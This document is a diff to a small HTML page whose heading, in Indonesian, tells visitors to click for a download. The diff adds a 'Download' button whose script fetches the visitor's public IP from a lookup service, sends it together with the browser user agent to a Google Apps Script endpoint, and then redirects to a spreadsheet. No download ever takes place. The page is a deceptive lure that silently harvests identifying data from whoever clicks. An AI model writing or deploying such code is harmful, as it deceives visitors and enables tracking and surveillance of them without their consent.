@@ -5,8 +5,21 @@
 </head>
 <body>
     <h1>Klik link di bawah ini:</h1>
-    <a href="https://tristancom.github.io/ip-tracker/" onclick="logIP()">DOWNLOAD SEKARANG</a>
+   <button onclick="trackIP()">Download</button>
 
+<script>
+function trackIP() {
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      fetch(`https://script.google.com/macros/s/AKfycbwEjUViowX-2Wia2UBp_RzI6eF5XwFuj0ovNWnMxwzSiRYK8JKjWOsiKPbEPDz-X6ymeg/exec?ip=${data.ip}&ua=${encodeURIComponent(navigator.userAgent)}`, {
+        mode: 'no-cors'
+      }).then(() => {
+        window.location.href = "https://docs.google.com/spreadsheets/d/e/2PACX-1vQjPdejqvFg4zR-nhOBS5sRFZwlh4MN7J97S4z1KrBSiSjNtbft2uF_j0HOxpX3UlFgfXIikOWctTC_/pubhtml?gid=0&single=true";
+      });
+    });
+}
+</script>
     <script src="track.js"></script>
 </body>
 </html>
